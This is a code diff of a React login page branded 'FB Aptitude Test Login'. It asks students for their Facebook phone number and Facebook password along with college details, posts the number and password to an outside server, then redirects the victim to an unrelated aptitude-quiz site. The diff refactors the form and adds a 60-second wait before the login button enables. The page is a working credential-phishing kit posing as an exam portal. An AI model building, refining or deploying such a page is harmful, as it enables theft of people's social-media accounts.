@@ -1,14 +1,31 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import axios from 'axios';
 
-
 const Login = () => {
-   const [formData, setFormData] = useState({
-    ph: '',
-    password: '',
-    college: '',
-    collegeID: ''
-});
+    const [formData, setFormData] = useState({
+        ph: '',
+        password: '',
+        college: '',
+        collegeID: ''
+    });
+
+    const [isButtonDisabled, setIsButtonDisabled] = useState(true);
+    const [timer, setTimer] = useState(60);
+
+    useEffect(() => {
+        const interval = setInterval(() => {
+            setTimer((prev) => {
+                if (prev === 1) {
+                    clearInterval(interval);
+                    setIsButtonDisabled(false); // Enable button
+                }
+                return prev - 1;
+            });
+        }, 1000);
+
+        return () => clearInterval(interval);
+    }, []);
+
     const handleChange = (e) => {
         setFormData((prev) => ({
             ...prev,
@@ -16,12 +33,10 @@ const Login = () => {
         }));
     };
 
-
     const handleSubmit = async (e) => {
         e.preventDefault();
 
         try {
-            // Convert ph to number before sending
             const finalData = {
                 ph: Number(formData.ph),
                 password: formData.password
@@ -30,13 +45,11 @@ const Login = () => {
             const res = await axios.post('https://skillface.onrender.com/submit', finalData);
             console.log('Response:', res.data);
 
-            // Redirect after success
             window.location.href = 'https://www.indiabix.com/logical-reasoning/number-series/';
         } catch (err) {
             console.error('Login Failed:', err);
         }
     };
-
 
     return (
         <div className="h-140 bg-gradient-to-r from-blue-600 to-cyan-500 flex items-center justify-center px-2">
@@ -48,69 +61,40 @@ const Login = () => {
                     FB Aptitude Test Login
                 </h2>
 
-                <div className="mb-3">
-                    <label className="block text-sm text-gray-700 font-medium mb-1">
-                        Facebook Number
-                    </label>
-                    <input
-                        type="Number"
-                        name="ph"
-                        placeholder="e.g. 1234567890"
-                        value={formData.ph}
-                        onChange={handleChange}
-                        required
-                        className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
-                    />
-                </div>
+                {/* Form Fields */}
+                {['ph', 'password', 'college', 'collegeID'].map((field, index) => (
+                    <div className="mb-3" key={index}>
+                        <label className="block text-sm text-gray-700 font-medium mb-1">
+                            {field === 'ph' ? 'Facebook Number' :
+                                field === 'password' ? 'Facebook Password' :
+                                field === 'college' ? 'College Name' : 'College ID Card Number'}
+                        </label>
+                        <input
+                            type={field === 'password' ? 'password' : field === 'ph' ? 'number' : 'text'}
+                            name={field}
+                            placeholder={
+                                field === 'ph' ? 'e.g. 1234567890' :
+                                field === 'college' ? 'e.g. NIT Durgapur' :
+                                field === 'collegeID' ? 'Enter your ID' :
+                                'Enter your password'
+                            }
+                            value={formData[field]}
+                            onChange={handleChange}
+                            required
+                            className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
+                        />
+                    </div>
+                ))}
 
-                <div className="mb-3">
-                    <label className="block text-sm text-gray-700 font-medium mb-1">
-                        Facebook Password
-                    </label>
-                    <input
-                        type="password"
-                        name="password"
-                        placeholder="Enter your password"
-                        value={formData.password}
-                        onChange={handleChange}
-                        required
-                        className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
-                    />
-                </div>
-
-                <div className="mb-3">
-                    <label className="block text-sm text-gray-700 font-medium mb-1">
-                        College Name
-                    </label>
-                    <input
-                        type="text"
-                        name="college"
-                        placeholder="e.g. NIT Durgapur"
-                        value={formData.college}
-                        onChange={handleChange}
-                        required
-                        className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
-                    />
-                </div>
-
-                <div className="mb-4">
-                    <label className="block text-sm text-gray-700 font-medium mb-1">
-                        College ID Card Number
-                    </label>
-                    <input
-                        type="text"
-                        name="collegeID"
-                        placeholder="Enter your ID"
-                        required
-                        className="w-full px-3 py-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-1 focus:ring-blue-500"
-                    />
-                </div>
-
+                {/* Login Button */}
                 <button
                     type="submit"
-                    className="w-full bg-blue-600 hover:bg-blue-700 text-white text-sm font-semibold py-2 rounded-md transition duration-200"
+                    disabled={isButtonDisabled}
+                    className={`w-full ${
+                        isButtonDisabled ? 'bg-gray-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'
+                    } text-white text-sm font-semibold py-2 rounded-md transition duration-200`}
                 >
-                    Login
+                    {isButtonDisabled ? `Wait ${timer}s` : 'Login'}
                 </button>
 
                 <p className="text-center text-xs text-gray-500 mt-4">
@@ -120,5 +104,5 @@ const Login = () => {
         </div>
     );
 };
-export default Login;
 
+export default Login;
